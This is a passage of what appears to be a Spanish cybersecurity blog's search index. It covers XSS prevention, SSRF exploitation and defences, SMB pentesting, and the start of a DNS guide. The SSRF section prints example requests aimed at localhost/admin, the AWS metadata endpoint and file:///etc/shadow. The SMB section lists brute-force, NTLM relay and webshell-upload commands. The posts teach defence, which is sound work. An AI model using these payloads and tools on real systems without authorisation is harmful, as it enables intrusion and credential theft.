el cual realiza un saneo de los caracteres especiales que pueda tener el par\u00e1metro de la consulta, adem\u00e1s insertamos dicho contenido mediante <code>textContent</code>.</p> <p>Tambi\u00e9n cabe destacar que podemos hacer uso de DOMPurify para sanitizar el contenido din\u00e1mico en aplicaciones web. DOMPurify es una biblioteca de JavaScript que purifica el HTML y elimina cualquier c\u00f3digo malicioso, proporcionando una capa adicional de seguridad contra ataques XSS. Es especialmente \u00fatil en aplicaciones frontend donde se manipula el DOM directamente.</p> <p><pre><code>const DOMPurify = require('dompurify');\napp.get('/comments', (req, res) =&gt; {\n  let html = '&lt;ul&gt;';\n  for(const comentario of comments){\n    const ComentarioSaneado = DOMPurify.sanitize(comentario);\n    html += `&lt;li&gt;${ComentarioSaneado}&lt;/li&gt;`;\n  }\n  html += '&lt;/ul&gt;';\n  res.send(html);\n});\n</code></pre> En este ejemplo, utilizamos DOMPurify para limpiar los comentarios antes de insertarlos en el DOM, asegurando que cualquier contenido potencialmente peligroso sea neutralizado.</p> <p>En este caso, a modo de demo hacemos uso del m\u00e9todo <code>encodeURIComponent</code> el cual realiza un saneo de los caracteres especiales que pueda tener el par\u00e1metro de la consulta, en un entorno mas estable har\u00edamos uso de DOMPurify para sanitizar el contenido din\u00e1mico en aplicaciones web. DOMPurify es una biblioteca de JavaScript que purifica el DOM (como su nombre indica), mitigando en gran medida cualquier tipo de inyecci\u00f3n de c\u00f3digo JavaScript, lo suficientemente flexible como para que el usuario introduzca todo lo que necesite pero sin poner en riesgo la seguridad de la aplicaci\u00f3n</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#conclusion","title":"Conclusi\u00f3n","text":"<p>Las vulnerabilidades XSS son un riesgo grave para la seguridad de las aplicaciones web. Sin embargo, mediante la implementaci\u00f3n de las medidas de prevenci\u00f3n descritas en este art\u00edculo, es posible proteger las aplicaciones web contra ataques XSS. En un futuro post, profundizaremos en las particularidades y consecuencias de las vulnerabilidades XSS en aplicaciones m\u00f3viles y de escritorio, donde el impacto de una explotaci\u00f3n exitosa puede ser a\u00fan mayor.</p> <p>En resumen, las claves para prevenir XSS son:</p> <ul> <li>Validar y sanear los datos de entrada del usuario.</li> <li>Escapar los datos de salida en el contexto adecuado.</li> <li>Realizar auditor\u00edas de seguridad peri\u00f3dicas.</li> <li>Capacitar a los desarrolladores en las mejores pr\u00e1cticas de seguridad web.</li> </ul> <p>En un futuro post, profundizaremos en las particularidades y consecuencias de las vulnerabilidades XSS en aplicaciones m\u00f3viles y de escritorio, donde el impacto de una explotaci\u00f3n exitosa puede ser a\u00fan mayor.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-02-2025/#recursos-adicionales","title":"Recursos Adicionales","text":"<ul> <li>OWASP Cross-Site Scripting (XSS)</li> <li>PortSwigger Web Security Academy</li> </ul> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Pentesting","XSS","JavaScript","Seguridad Web","Vulnerabilidades","Desarrollo Seguro","Inyecci\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/23-03-2025/","title":"Server-Side Request Forgery: La Puerta Trasera que Puede Derribar tu Infraestructura","text":"<p>En el \u00e1mbito de la seguridad web, las vulnerabilidades Server-Side Request Forgery (SSRF) destacan como una de las amenazas m\u00e1s cr\u00edticas y subestimadas. Permiten a los atacantes manipular servidores para realizar peticiones HTTP no autorizadas a sistemas internos, comprometiendo desde APIs y servicios en la nube hasta infraestructuras protegidas por firewalls.</p> <p>Esta t\u00e9cnica de ataque, a menudo subestimada, puede transformar un servidor aparentemente seguro en una puerta de entrada para los ciberdelincuentes, permiti\u00e9ndoles acceder a recursos internos, robar datos sensibles e incluso lanzar ataques contra terceros.</p> <p>\u00bfEl resultado? Robo de datos, acceso a servicios internos, ejecuci\u00f3n remota de c\u00f3digo y, en \u00faltima instancia, da\u00f1o a la reputaci\u00f3n, multas por incumplimiento de normativas como GDPR, y p\u00e9rdidas financieras significativas. Un ataque SSRF exitoso puede paralizar operaciones cr\u00edticas y comprometer la confianza de los clientes.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#que-es-una-vulnerabilidad-ssrf","title":"\u00bfQu\u00e9 es una vulnerabilidad SSRF?","text":"<p>Las vulnerabilidades de Server-Side Request Forgery (SSRF) se dan cuando un atacante puede manipular un servidor para que realice solicitudes no autorizadas. Imagina que un servidor web act\u00faa como un mensajero que normalmente entrega mensajes (solicitudes) solo a destinatarios autorizados. Pues la explotaci\u00f3n de un ataque SSRF ser\u00eda el equivalente a que un extra\u00f1o forzara al mensajero a mandar cartas a cualquier destinatario sin filtro, pudiendo mandar mensajes sin pasar por aduana y con remitente oficial.  </p> <p>Para ver un caso m\u00e1s concreto, consideremos una aplicaci\u00f3n de compras que consulta el stock de productos mediante solicitudes a una API REST. La aplicaci\u00f3n pasa la URL a consultar al endpoint de la API a trav\u00e9s de una solicitud HTTP. Un atacante que notase esto, podr\u00eda modificar esta URL para acceder a otros endpoints internos de la API, pudiendo llegar a obtener informaci\u00f3n no autorizada, como datos de otros usuarios.</p> <p>Adem\u00e1s, los ataques SSRF no se limitan al protocolo HTTP. En ciertos casos, un atacante podr\u00eda intentar usar otros esquemas de URI, como <code>file://</code> para acceder a archivos locales en el servidor, <code>smb://</code> para forzar una autenticaci\u00f3n y obtener un hash NTLM u otros protocolos de diversa \u00edndole.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#impacto-de-los-ataques-ssrf","title":"Impacto de los ataques SSRF","text":"<p>Por lo general, un ataque SSRF puede resultar en el acceso no autorizado a recursos internos. Adem\u00e1s, en algunas situaciones, la vulnerabilidad SSRF podr\u00eda permitir a un atacante la ejecuci\u00f3n de comandos arbitrarios mediante ciertas cadenas de vulnerabilidades.</p> <p>Cuando un SSRF se puede utilizar para establecer conexiones con sistemas externos de terceros, un atacante puede emplearlo para llevar a cabo ataques de suplantaci\u00f3n. Esto significa que los ataques parecer\u00e1n originarse desde la organizaci\u00f3n que aloja la aplicaci\u00f3n vulnerable. Por ejemplo, un atacante podr\u00eda aprovechar un servidor con SSRF para escanear puertos en la red interna de otra empresa o incluso lanzar un ataque de denegaci\u00f3n de servicio (DoS) contra un servicio externo, haciendo que parezca que la ofensiva proviene de la organizaci\u00f3n comprometida.</p> <p>Otro posible escenario de explotaci\u00f3n, es la exploraci\u00f3n de redes internas (intranet), donde un atacante puede aprovechar el SSRF para enviar solicitudes a direcciones internas a trav\u00e9s del servidor afectado. Esto le permitir\u00eda identificar puertos abiertos, mapear servicios internos y recopilar informaci\u00f3n sensible sobre la infraestructura de la red. La gravedad del ataque aumenta si el servidor comprometido posee acceso privilegiado a recursos internos que normalmente estar\u00edan protegidos contra accesos externos.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#tipos-de-server-side-request-forgery","title":"Tipos de Server-Side Request Forgery","text":"<p>Existen dos tipos principales de ataques Server-Side Request Forgery (SSRF):</p> <ul> <li>SSRF est\u00e1ndar: En este tipo de ataque, la respuesta del servidor se muestra directamente al atacante. El servidor obtiene la URL solicitada por el atacante y env\u00eda el contenido (o parte de \u00e9l) en la respuesta de vuelta.</li> <li>SSRF a ciegas (Blind SSRF): En este caso, la respuesta no se env\u00eda de vuelta al atacante. El atacante debe idear formas de confirmar y explotar la vulnerabilidad sin ver directamente la respuesta del servidor.</li> </ul> <p>A continuaci\u00f3n, veremos las caracter\u00edsticas y m\u00e9todos de explotaci\u00f3n propios de cada tipo de SSRF. Adem\u00e1s de posibles enfoques para la detecci\u00f3n y mitigaci\u00f3n de estas vulnerabilidades.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#ssrf-estandar","title":"SSRF Est\u00e1ndar","text":"<p>El ataque de SSRF est\u00e1ndar es la forma m\u00e1s directa de realizar este ataque. En este escenario, el atacante puede observar directamente la respuesta del servidor a la solicitud manipulada. Esto puede permitir al atacante recopilar informaci\u00f3n detallada sobre la red interna, identificar servicios accesibles y recuperar datos potencialmente sensibles.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#metodologia-de-explotacion","title":"Metodolog\u00eda de explotaci\u00f3n","text":"<p>La explotaci\u00f3n de este tipo de SSRF se divide en 3 fases:</p> <ol> <li>Inyecci\u00f3n: El atacante introduce una URL maliciosa en un campo de entrada de la aplicaci\u00f3n.</li> <li>Solicitud: El servidor, sin validar la URL, realiza una solicitud al recurso especificado por el atacante.</li> <li>Revelaci\u00f3n: La respuesta del servidor se devuelve al atacante, permiti\u00e9ndole acceder a informaci\u00f3n interna.</li> </ol> <p>En el siguiente ejemplo tenemos una aplicaci\u00f3n web que permite consultar el stock de los productos que oferta. Para poder ver las peticiones de manera m\u00e1s clara usaremos un proxy de aplicaci\u00f3n como es el caso de BurpSuite, as\u00ed veremos la solicitud que se realiza al consultar el stock de los productos:</p> <pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=stockApi=http://internal-stock-api/check?productId=123\n</code></pre> <p>Esta solicitud hace que el cliente reciba el stock del producto indicado mediante el <code>productId</code>. Sin embargo, un atacante podr\u00eda modificar la petici\u00f3n a la URL que se especifica, como por ejemplo:</p> <pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://localhost/admin\n</code></pre> <p>Al mandar esta solicitud, si existe el directorio <code>/admin</code> en la m\u00e1quina atacada y es procesada sin m\u00e1s validaci\u00f3n, el atacante podr\u00eda llegar a acceder al panel de administraci\u00f3n interno.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#ejemplo-de-explotacion-para-obtener-acceso-a-metadatos-de-amazon-ec2","title":"Ejemplo de explotaci\u00f3n para obtener acceso a metadatos de Amazon EC2","text":"<p>Un caso com\u00fan de explotaci\u00f3n de SSRF es en el que al atacante accede a metadatos internos de una instancia de EC2 en AWS: <pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://169.254.169.254/latest/meta-data/\n</code></pre> El acceso a esta API podr\u00eda revelar informaci\u00f3n sensible como claves de acceso, roles IAM u otra informaci\u00f3n sensible.</p> <p>Podemos encontrar contramedidas especificas en la documentacion de AWS.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#ejemplo-de-explotacion-para-la-lectura-de-archivos-locales","title":"Ejemplo de explotaci\u00f3n para la lectura de archivos locales:","text":"<p>Si la aplicaci\u00f3n habilita el uso del esquema <code>file://</code>, un atacante podr\u00eda intentar leer archivos del sistema de la siguiente manera:</p> <pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=file:///etc/shadow\n</code></pre>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#ssrf-a-ciegas","title":"SSRF a ciegas","text":"<p>El caso del ataque SSRF a ciegas representa un desaf\u00edo mayor, ya que no se recibe la respuesta del servidor directamente, En este tipo de ataque, el atacanted debe inferir el \u00e9xito de su intrusi\u00f3n a trav\u00e9s de cambios observables en el comportamiento de la aplicaci\u00f3n o mediante la interacci\u00f3n con un servidor externo. Un atacante podr\u00eda usar este tipo de SSRF para abusar de funciones internas que normalmente no est\u00e1n expuestas o para atacar un servicio de terceros.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#metodologia-de-explotacion_1","title":"Metodolog\u00eda de explotaci\u00f3n","text":"<p>Imaginemos una aplicaci\u00f3n web que permite a los usuarios subir im\u00e1genes de perfil. La aplicaci\u00f3n verifica que la imagen sea v\u00e1lida haciendo una solicitud a la URL proporcionada, pero no muestra el resultado de esta verificaci\u00f3n al usuario.</p> <p>Una implementaci\u00f3n rudimentaria ser\u00eda la siguiente:</p> <pre><code>import requests\ndef verify_image(url):\n  try:\n    response = requests.get(url, timeout=5)\n    if response.headers.get('content-type', '').startswith('image/'):\n      return True\n  except:\n    pass\n    return False\n\n  user_provided_url = \"https://example.com/image.jpg\"\n  if verify_image(user_provided_url):\n    print(\"Valid image\")\n  else:\n    print(\"Rejected URL\")\n</code></pre> <p>En este caso, el servidor recibe una URL, en este caso es <code>https://example.com/image.jpg</code> y luego realiza una solicitud HTTP a esa URL para verificar si contiene una imagen. Finalmente, si la URL proporcionada devuelve un recurso, con Content-Type: image/* se dar\u00e1 como v\u00e1lida.</p> <p>El problema radica en que el servidor conf\u00eda ciegamente en las URLs proporcionadas por los usuarios, permitiendo que se realicen solicitudes HTTP arbitrarias.</p> <p>Si un atacante suministra una URL controlada por \u00e9l mismo o que apunte a un recurso interno del servidor, como <code>http://internal-server/sensitive-data</code>, el atacante no ver\u00e1 directamente la respuesta del servidor, pero podr\u00e1 deducir si la solicitud fue exitosa observando ciertos comportamientos:</p> <ul> <li>Tiempo de respuesta: Un recurso interno que tarda m\u00e1s en responder podr\u00eda indicar que el servidor accedi\u00f3 al recurso.</li> <li>Mensajes de error: Diferencias en los errores devueltos por el servidor pueden confirmar la existencia del recurso.</li> </ul> <p>Para verificar si se realiza la solicitud a la URL suministrada, se emplean t\u00e9cnicas de fuera de banda (OOB), como el monitoreo de solicitudes DNS o HTTP hacia dominios controlados por el atacante. Por ejemplo, podr\u00eda ser la siguiente URL <code>http://internal-server.sensitive-data.attacker-domain.com</code>. Aqu\u00ed, <code>attacker-domain</code> es un dominio controlado por el atacante. Si el servidor vulnerable procesa esta URL, intentar\u00e1 resolver el dominio y realizar una solicitud HTTP hacia \u00e9l. Esto permite al atacante detectar la actividad monitoreando su propio servidor DNS o web. Esta funcionalidad est\u00e1 integrada mediante el Colaborator en la versi\u00f3n profesional de BurpSuite.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#como-prevenir-los-ataques-ssrf","title":"Como prevenir los ataques SSRF","text":"<p>Como hemos visto anteriormente, este tipo de ataques son particularmente peligrosos facilitando la explotaci\u00f3n de recursos internos. Para protegerse contra este tipo de vulnerabilidad, es fundamental implementar una combinaci\u00f3n de medidas de seguridad robustas. A continuaci\u00f3n, se detallan las estrategias m\u00e1s efectivas:</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#validar-estrictamente-la-entrada","title":"Validar estrictamente la entrada","text":"<p>Para protegernos ante un ataque de SSRF, podemos hacer uso de:</p> <ul> <li>Whitelists: Podemos permitir que el servidor acceda a URLs espec\u00edficas y que sean confiables para el correcto uso de la aplicaci\u00f3n. En lugar de permitir cualquier URL, define una lista blanca de dominios y rutas a las que el servidor puede acceder. Cualquier solicitud que no coincida con esta lista blanca debe ser rechazada. Ejemplo: <code>permitidos = [\"api.ejemplo.com/productos\", \"imagenes.ejemplo.com\"]</code>.</li> <li>Bloqueo de direcciones internas: Podemos bloquear solicitudes a URLs internas, con el fin de que no se puedan acceder a recursos internos del servidor (<code>localhost</code> o cualquier IP del estilo <code>192.168.x.x</code>). Configura el servidor para rechazar cualquier solicitud a direcciones IP privadas (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16) y a <code>localhost</code> (127.0.0.1). Esto previene el acceso no autorizado a recursos internos de la red, impidiendo que un atacante manipule el servidor para acceder a servicios o datos que deber\u00edan estar protegidos.</li> <li>Restringir protocolos: Podemos bloquear protocolos como smb://, file://, entre otros. Limitar los protocolos a HTTP(S) reduce la superficie de ataque, evitando que se utilicen otros protocolos potencialmente inseguros para acceder a recursos internos o externos.</li> </ul>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#uso-de-web-application-firewalls-wafs","title":"Uso de Web Application Firewalls (WAFs)","text":"<p>Podemos configurar un WAF con reglas espec\u00edficas puede ayudar a detectar y bloquear patrones sospechosos relacionados con SSRF. Los WAFs pueden actuar como una capa adicional de defensa al monitorear y filtrar el tr\u00e1fico saliente del servidor. </p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#segmentacion-de-red","title":"Segmentaci\u00f3n de Red","text":"<p>Podemos dividir la red en segmentos y limitar el acceso entre ellos. Por ejemplo, si el servidor web no deber\u00eda tener acceso directo a la base de datos, por que hace uso de una API. Entonces, deber\u00eda limitarse la capacidad de mandar tr\u00e1fico directamente al servidor de bases de datos. De manera general el host no deberia poder acceder a mas servicios internos de los estrictamente necesarios para su funcionamiento, minimizando la superficie de ataque.Este enfoque debe adaptarse a la situaci\u00f3n concreta de cada servicio.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#implementar-monitorizacion","title":"Implementar monitorizaci\u00f3n","text":"<p>Aunque el SSRF a ciegas no muestra respuestas directamente al atacante, las t\u00e9cnicas fuera de banda dejan trazas que pueden ayudar a detectar intentos maliciosos. A fin de detectar estas t\u00e9cnicas es crucial configurar la monitorizaci\u00f3n de las requests DNS emitidas por los servidores de aplicaci\u00f3n a fin de identificar solicitudes inesperadas hacia dominios externos.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#pruebas-periodicas-de-seguridad","title":"Pruebas peri\u00f3dicas de seguridad","text":"<p>Realizar auditor\u00edas de seguridad peri\u00f3dicas, para proteger tus aplicativos web contra esta y otras amenazas.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/23-03-2025/#conclusion","title":"Conclusi\u00f3n","text":"<p>La prevenci\u00f3n de ataques SSRF requiere un enfoque de seguridad en capas, combinando validaci\u00f3n de entrada, uso de WAFs, actualizaciones regulares, segmentaci\u00f3n de red y pruebas de seguridad. Al implementar estas medidas, podemos reducir significativamente el riesgo de que nuestra infraestructura sea comprometida por esta vulnerabilidad. Recuerda que la seguridad es un proceso continuo, y es importante mantenerse actualizado sobre las \u00faltimas vulnerabilidades y t\u00e9cnicas de ataque.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Pentesting","SSRF","Seguridad Web","Vulnerabilidades"]},{"location":"es/blog/posts/24-11-2024/","title":"SMB 101","text":"<p>SMB (Server Message Block) es un protocolo utilizado para compartir recursos como archivos, impresoras y directorios en una red. Utiliza una arquitectura cliente-servidor, donde el servidor pone los recursos a disposici\u00f3n y m\u00faltiples clientes pueden acceder a ellos. Aunque SMB3 introduce cifrado para proteger los datos, versiones anteriores como SMB1 transmiten informaci\u00f3n en texto plano, lo que las hace vulnerables a ciertos ataques.</p> <p>En este art\u00edculo, nos centraremos en conceptos b\u00e1sicos, comandos clave y ataques comunes relacionados con SMB, destacando el uso de herramientas como enum4linux para la enumeraci\u00f3n.</p>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#teoria","title":"Teor\u00eda","text":"","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#puertos-usados-por-smb","title":"Puertos usados por SMB","text":"<p>SMB opera principalmente en los siguientes puertos:</p> <ul> <li>445/TCP: Utilizado por SMB modernos para conexiones directas sin NetBIOS.</li> <li>139/TCP: Utilizado por versiones antiguas dependientes de NetBIOS.</li> </ul>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#autenticacion-en-smb","title":"Autenticaci\u00f3n en SMB","text":"<p>SMB emplea varios mecanismos de sincronizaci\u00f3n:</p> <ul> <li>NTLM (LAN Manager): Vulnerable a ataques de transmisi\u00f3n y de fuerza bruta.</li> <li>Kerberos: M\u00e1s seguro, usando en entornos con Active Directory.</li> </ul>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#enumeracion-con-smb","title":"Enumeraci\u00f3n con SMB","text":"<p>La enumeraci\u00f3n es el paso inicial para recoger informaci\u00f3n sobre los recursos compartidos, los usuarios, y otras configuraciones del servidor SMB. Aqu\u00ed hay algunas herramientas comunes para este prop\u00f3sito:</p>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#enum4linux","title":"Enum4linux","text":"<p>Enum4linux es una herramienta de enumeraci\u00f3n dise\u00f1ada espec\u00edficamente para SMB. Nos permite identificar los recursos compartidos, pol\u00edticas de contrase\u00f1as, y los usuarios en sistemas Windows.</p> <p>Comandos comunes:</p> <pre><code>enum4linux &lt;IP&gt;\n</code></pre> <p>Modos espec\u00edficos:</p> <ul> <li> <p>Enumeraci\u00f3n de usuarios: <pre><code>enum4linux -U &lt;IP&gt;\n</code></pre></p> </li> <li> <p>Enumeraci\u00f3n de recursos compartidos: <pre><code>enum4linux -S &lt;IP&gt;\n</code></pre></p> </li> <li> <p>Enumeraci\u00f3n de la informaci\u00f3n del dominio: <pre><code>enum4linux -n &lt;IP&gt;\n</code></pre></p> </li> </ul> <p>Salidas t\u00edpicas:</p> <ul> <li>Recursos compartidos disponibles.</li> <li>Usuarios del sistema.</li> <li>Pol\u00edticas de contrase\u00f1as, como la caducidad o la longitud m\u00ednima.</li> </ul>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#smbclient","title":"SMBClient","text":"<p>SMBClient es una herramienta integrada en sistemas Linux para interactuar directamente con recursos SMB.</p> <p>Ejemplo de uso:</p> <p><pre><code>smbclient //&lt;IP&gt;/&lt;nombre_recurso&gt; -U &lt;usuario&gt;\n</code></pre> Despu\u00e9s de conectarnos, podemos listar, descargar, y subir archivos con comandos similares a los de FTP.</p> <pre><code>ls # Lista el directorio actual (gesti\u00f3n de archivos y navegaci\u00f3n similar a Linux)\nget # Descarga archivos\nput # Sube archivos\n</code></pre> <p>Enumerar recursos compartidos:</p> <pre><code>smbclient -L //&lt;IP&gt; -U &lt;usuario&gt;\n</code></pre>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#ataques-comunes-a-smb","title":"Ataques Comunes a SMB","text":"","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#sesiones-nulas-null-sessions","title":"Sesiones Nulas (Null Sessions)","text":"<p>Las sesiones nulas ocurren cuando el servidor SMB permite conexiones sin autenticaci\u00f3n, exponiendo informaci\u00f3n como los recursos compartidos y usuarios.</p> <p>Enumeraci\u00f3n de sesiones nulas con smbclient:</p> <pre><code>smbclient -L //&lt;IP&gt; -N\n</code></pre> <p>Danger</p> <p>Los atacantes pueden utilizar esta informaci\u00f3n para planear ataques m\u00e1s avanzados, como ataques de fuerza bruta a contrase\u00f1as.</p>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#fuerza-bruta-y-password-spraying","title":"Fuerza Bruta y Password Spraying","text":"<p>SMB puede ser vulnerable a ataques de fuerza bruta si no se implementan las medidas de seguridad adecuadas. Herramientas como Hydra y Medusa son comunes para este prop\u00f3sito.</p> <p>Hydra para SMB:</p> <pre><code>hydra -L users.txt -P passwords.txt smb://&lt;IP&gt;\n</code></pre> <p>NetExec:</p> <pre><code>nxc smb &lt;IP&gt; -u users.txt -p passwords.txt\n</code></pre> <p>Danger</p> <p>Los atacantes pueden ganar acceso no autorizado para compartir recursos si se descifran credenciales v\u00e1lidas.</p>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#ntlm-relay","title":"NTLM Relay","text":"<p>Este ataque intercepta y reenv\u00eda autenticaciones NTLM para hacerse pasar por el usuario leg\u00edtimo. Los servidores SMB con la forma desactivada son especialmente vulnerables.</p> <p>Utilizando Responder:</p> <pre><code>responder -I &lt;interfaz_red&gt;\n</code></pre> <p>Tip</p> <p>Con el fin de mitigarlo, habilite la firma SMB y utilice la autenticaci\u00f3n de Kerberos en lugar de NTLM.</p>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#credential-sniffing","title":"Credential Sniffing","text":"<p>Versiones antiguas como SMB1 transmiten credenciales en texto plano, permitiendo que los atacantes capturen las credenciales con herramientas como Wireshark.</p> <p>Filtros Wireshark:</p> <pre><code>tcp.port == 445\n</code></pre> <p>Danger</p> <p>Un atacante puede utilizar las credenciales interceptadas para acceder al servidor SMB.</p>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#carga-de-archivos-para-rce","title":"Carga de archivos para RCE","text":"<p>Si un recurso SMB permite la escritura, un atacante puede subir un archivo malicioso, como una web shell, para ejecutar c\u00f3digo remotamente.</p> <p>Subiendo un archivo con SMBClient:</p> <pre><code>smbclient //&lt;IP&gt;/&lt;nombre_recurso&gt; -U &lt;usuario&gt;\nput webshell.aspx\n</code></pre> <p>Danger</p> <p>Esto puede comprometer al servidor, permitiendo la ejecuci\u00f3n de comandos o la instalaci\u00f3n de malware.</p>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/24-11-2024/#defensas-en-contra-de-los-exploits-smb","title":"Defensas en contra de los exploits SMB","text":"<ol> <li>Deshabilita SMB1: Est\u00e1 obsoleto y es vulnerable. Sustit\u00fayelo ya sea por SMB2 o SMB3:     <pre><code>Set-SmbServerConfiguration -EnableSMB1Protocol $false\n</code></pre></li> <li>Habilita SMB Singing: Para prevenir ataques de retransmisi\u00f3n NTLM.</li> <li>Restringe los permisos: Asegura que los recursos compartidos est\u00e1n protegidos con permisos estrictos.</li> <li>Cifrado SMB3: SMB3 permite cifrar el tr\u00e1fico, protegiendo as\u00ed contra ataques de sniffing.</li> <li>Monitorizaci\u00f3n peri\u00f3dica: Utiliza herramientas como Splunk o Wireshark para detectar actividad an\u00f3mala.</li> </ol> <p>En el siguiente art\u00edculo de esta serie sobre SMB hablaremos de errores comunes de implementaci\u00f3n y de algunas vulnerabilidades conocidas de algunas implementaciones del protocolo.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Pentesting","SMB"]},{"location":"es/blog/posts/26-01-2025/","title":"Gu\u00eda completa sobre DNS: Visi\u00f3n general, Configuraci\u00f3n y Seguridad","text":"<p>Comprender el DNS (Domain Name System ) es esencial para cualquier persona interesada en el funcionamiento de Internet. El DNS juega un papel crucial en la traducci\u00f3n de nombres de dominio legibles por el ser humano a direcciones IP, lo que garantiza una fluidez en la navegaci\u00f3n web.</p> <p>Esta gu\u00eda le guiar\u00e1 a trav\u00e9s de:</p> <ul> <li>Las estructuras jer\u00e1rquicas del DNS y sus componentes claves.</li> <li>Los tipos de consultas DNS y como funcionan.</li> <li>Las preocupaciones sobre la seguridad del DNS y medidas de protecci\u00f3n como DNSSEC.</li> <li>La Configuraci\u00f3n de un servidor DNS local mediante BIND9 para la mejora del rendimiento, privacidad y el filtrado de contenido.</li> </ul> <p>Asi que, si quiere llevar sus conocimientos al siguiente nivel y descubrir como este sistema jer\u00e1rquico garantiza que cada p\u00e1gina web que visites est\u00e9 a un solo clic de distancia, sigue leyendo.</p>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#lo-basico-que-hace-un-dns","title":"Lo b\u00e1sico: \u00bfQu\u00e9 Hace Un DNS?","text":"<p>Cuando introduces un nombre de dominio en tu navegador, el ordenador no entiende ese nombre directamente. En su lugar, tu dispositivo inicia un proceso llamado resoluci\u00f3n de nombre (domain resolution) para encontrar la direcci\u00f3n IP correspondiente. Los servidores DNS se encargan de esta resoluci\u00f3n mediante un sistema estructurado y jer\u00e1rquico.</p>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#la-jerarquia-de-los-servidores-dns","title":"La Jerarqu\u00eda de los Servidores DNS","text":"Jerarqu\u00eda de Servidores DNS para Google <p>El DNS opera como un sistema jer\u00e1rquico distribuido. Cada nivel en esta jerarqu\u00eda juega un papel espec\u00edfico en la traducci\u00f3n de nombres de dominio en direcciones IP. As\u00ed es como funciona:</p>","tags":["DNS","Redes","Seguridad","Rendimiento","Home Lab","Administraci\u00f3n de Servidores"]},{"location":"es/blog/posts/26-01-2025/#resolucion-recursiva-la-consulta-dns-comienza-aqui","title":"Resoluci\u00f3n Recursiva (La Consulta DNS Comienza Aqu\u00ed)","text":"<ul> <li>Cuando escribes una URL en tu navegador, tu dispositivo manda una petici\u00f3n a un servidor DNS recursivo (recursive resolver). Este suele estar proporcionado por su proveedor de servicios de Internet (ISP) or un servicio de terceros como Google Public DNS o Cloudflare.</li> <li>El trabajo del servidor DNS recursivo consiste en gestionar su consulta y obtener la direcci\u00f3n IP correcta poni\u00e9ndose en contacto con otros servidores DNS en su nombre.</li> 